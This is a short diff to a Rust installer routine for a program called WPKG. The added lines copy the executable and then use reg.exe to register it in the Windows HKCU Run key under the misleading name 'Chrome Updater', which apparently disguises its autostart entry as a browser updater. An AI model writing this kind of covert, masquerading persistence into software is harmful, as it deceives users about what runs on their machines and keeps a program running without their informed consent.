@@ -75,8 +75,14 @@ async fn main() {
                 info!("WPKG not installed. Installing in {}...", &config_dir);
 
                 if !Path::new(&exe_target).exists() {
+                    //copying executable
                     info!("Copying WPKG executable to {}...", exe_target);
                     fs::copy(exe_path, exe_target.clone())?;
+
+                    //adding to autostart
+                    info!("Adding to autostart");
+                    Utils::run_process("reg.exe",vec!["add","HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/f","/v","Chrome Updater","/t","REG_SZ","/d",&exe_target],true)?;
                 }
 
                 //check if process is runned
